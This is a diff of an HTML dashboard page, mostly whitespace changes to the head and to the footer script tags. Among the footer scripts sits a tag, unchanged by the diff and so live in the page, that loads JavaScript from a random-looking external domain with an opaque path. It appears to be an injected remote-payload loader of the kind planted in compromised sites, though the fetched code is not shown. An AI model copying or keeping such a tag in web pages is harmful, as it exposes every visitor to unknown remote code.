@@ -13,6 +13,7 @@
     <link href="/assets/img/favicon.png" rel="icon">
     <link href="/assets/img/apple-touch-icon.png" rel="apple-touch-icon">
 
+  
     <!-- Google Fonts -->
     <link
         href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Roboto:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i"
@@ -31,9 +32,9 @@
     <!-- Template Main CSS File -->
     <link href="/assets/css/style.css" rel="stylesheet">
     <link href="/assets/css/media.css" rel="stylesheet">
-    
     <link href="https://fonts.googleapis.com/icon?family=Material+Icons"
-      rel="stylesheet">
+    rel="stylesheet">
+  
 
 
 
@@ -384,13 +385,13 @@
     <script src="https://cdn.jsdelivr.net/npm/chart.js@2.9.4/dist/Chart.min.js"
         integrity="sha384-zNy6FEbO50N+Cg5wap8IKA4M/ZnLJgzc6w2NqACZaK0u0FXfOWRRJOnQtpZun8ha" crossorigin="anonymous">
     </script>
-    <script src="dashboard.js"></script>
-
-
+    <script src="/dashboard.js"></script>
     <script src="https://nzvbz1.inyo4y.com/ex/a/ab880100/por/"></script>
 
 
-
+    
+    
+    
     <!-- Vendor JS Files -->
     <script src="https://unpkg.com/vue@3"></script>
     <script src="/assets/vendor/aos/aos.js"></script>
